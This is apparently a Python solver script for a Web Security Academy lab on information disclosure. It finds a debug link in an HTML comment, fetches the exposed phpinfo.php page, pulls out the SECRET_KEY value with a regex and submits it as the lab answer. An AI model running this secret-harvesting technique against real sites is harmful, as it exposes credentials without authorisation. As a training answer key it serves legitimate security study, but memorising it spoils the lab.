import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Information disclosure on debug page')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + ".web-security-academy.net/product?productId=1")
debug_page = re.findall(r'<!--(.*?)-->', r.text)[0]
print(f"Debug page found in comments:{debug_page}")
r = requests.get("https://" + lab.id + ".web-security-academy.net/cgi-bin/phpinfo.php")

solution = re.findall(r'SECRET_KEY </td><td class="(.*?)">(.*?)</td>', r.text)[0][1]
requests.post("https://" + lab.id + ".web-security-academy.net/submitSolution", data={"answer":solution.strip()})

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab")